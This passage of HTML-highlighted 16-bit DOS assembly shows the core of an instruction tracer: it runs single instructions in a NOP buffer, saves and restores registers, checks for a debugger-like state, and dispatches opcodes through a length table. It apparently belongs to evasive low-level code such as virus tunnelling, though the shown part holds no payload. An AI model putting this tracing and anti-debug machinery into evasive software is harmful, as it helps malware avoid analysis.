        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">_ip</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@replace</span><span class="sc0">

</span><span class="sc5">@@Debno</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@Deb2</span><span class="sc0">

</span><span class="sc5">@@Deb1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">opcodeFFflag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@@Deb2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc1">;-ú--ú-ú-ú--ú--ú-ú--úú-ú-úú-ú--ú-ú--ú-úú-ú-ú--ú-ú--ú-úú-ú-úú-ú-ú--ú-ú--ú-ú-ú-</span><span class="sc0">
</span><span class="sc1">;                       Instructions execution zone</span><span class="sc0">
</span><span class="sc1">;ú-ú--ú--ú-ú--ú-úú-ú--ú-úú-ú-úú-úúú-ú--ú-ú--ú--ú-ú--ú-ú--ú-úú-ú-ú--ú-úú-ú-ú--</span><span class="sc0">

</span><span class="sc5">ejecuci</span><span class="sc0">¢</span><span class="sc5">n</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@set_registers_emu</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss2</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp2</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">


</span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">nop</span><span class="sc0">                             </span><span class="sc1">; Neccesary nops ( prefixes+rep )</span><span class="sc0">
</span><span class="sc5">execi</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">; Six nops to place instruction</span><span class="sc0">
</span><span class="sc6">cli</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">       </span><span class="sc1">; Store registers again</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">_ds</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10d</span><span class="sc0">
</span><span class="sc5">@store_regs_emu</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@store_regs_emu</span><span class="sc0">





        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_csflag</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@_notCs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ds2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ds</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@_notCs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_csflag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc0">

</span><span class="sc1">;*****************</span><span class="sc0">
</span><span class="sc1">;           Push &amp; Pop Registers</span><span class="sc0">
</span><span class="sc1">;                   ******************</span><span class="sc0">

</span><span class="sc5">push_all_regs</span><span class="sc4">:</span><span class="sc0">
                               </span><span class="sc1">; Pushes all registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">call_flag</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">call_flag</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">pop_all_regs</span><span class="sc4">:</span><span class="sc0">
                              </span><span class="sc1">; Restores all registers</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">call_flag</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">call_flag</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">call_flag</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">offset_table</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; 00h-02h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">      </span><span class="sc1">; 03h-05h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@pushstack</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; 06h-08h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; 09h-0bh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@pushstack</span><span class="sc0">   </span><span class="sc1">; 0ch-0eh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">                                              </span><span class="sc1">; 0fh</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc0">   </span><span class="sc1">; 60h-62h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc0">   </span><span class="sc1">; 63h-65h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">      </span><span class="sc1">; 66h-68h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc0">   </span><span class="sc1">; 69h-6bh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; 6ch-6eh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">                                              </span><span class="sc1">; 6fh</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jojmp</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jnojmp</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jbjmp</span><span class="sc0">       </span><span class="sc1">; 70h-72h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jnbjmp</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jzjmp</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jnzjmp</span><span class="sc0">      </span><span class="sc1">; 73h-75h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jbejmp</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jajmp</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jsjmp</span><span class="sc0">       </span><span class="sc1">; 76h-78h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jnsjmp</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jpejmp</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jpojmp</span><span class="sc0">      </span><span class="sc1">; 79h-7bh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jljmp</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jgejmp</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Jlejmp</span><span class="sc0">      </span><span class="sc1">; 7ch-7eh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@jgjmp</span><span class="sc0">                                               </span><span class="sc1">; 7fh</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable2</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable3</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable2</span><span class="sc0">   </span><span class="sc1">; 80h-82h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable2</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; 83h-85h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; 86h-88h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; 89h-8bh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; 8ch-8eh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">                                           </span><span class="sc1">; 8fh</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; 90h-92h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; 93h-95h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; 96h-98h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Fcall</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; 99h-9bh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; 9ch-9eh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">                                              </span><span class="sc1">; 9fh</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">      </span><span class="sc1">; a0h-a2h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; a3h-a5h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc0">      </span><span class="sc1">; a6h-a8h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; a9h-abh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; ach-aeh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">                                              </span><span class="sc1">; afh</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc0">      </span><span class="sc1">; b0h-b2h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc0">      </span><span class="sc1">; b3h-b5h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">      </span><span class="sc1">; b6h-b8h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">      </span><span class="sc1">; b9h-bbh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">      </span><span class="sc1">; bch-beh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes3</span><span class="sc0">                                              </span><span class="sc1">; bfh</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable2</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable2</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@RetNum</span><span class="sc0">      </span><span class="sc1">; c0h-c2h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@RetKind</span><span class="sc4">,</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; c3h-c5h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable2</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable3</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc0">   </span><span class="sc1">; c6h-c8h</span><span class="sc0">
